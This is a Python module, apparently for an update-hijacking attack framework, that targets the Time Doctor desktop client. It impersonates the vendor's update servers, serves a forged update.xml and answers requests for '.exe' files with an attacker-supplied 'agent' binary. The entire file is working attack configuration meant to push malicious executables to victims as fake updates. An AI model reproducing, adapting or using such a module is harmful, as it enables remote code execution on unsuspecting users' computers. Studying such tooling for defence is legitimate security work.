from modules import ModuleBase


class TimeDoctor(ModuleBase):
    name = 'timedoctor'
    version = '1.2'
    appver = 'tdlite <= 2.3.46.6, tdpro <= 1.4.72.6'
    author = [
        'Fernando Munoz <fernando +[AT]+ null-life.com>',
        'Daniel Correa <daniel +[AT]+ null-life.com'
    ]
    description = ''
    vh = '(updates.timedoctor.com|myserver.timedoctor.com)'
    requests = [{
            'path': 'windows/update.xml',
            'type': 'file',
            'method': '',
            'bin': '0',
            'string': '',
            'parse': '1',
            'file': './include/timedoctor/windows.xml',
        }, {
            'path': '.exe',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': '0',
            'file': ''
        }]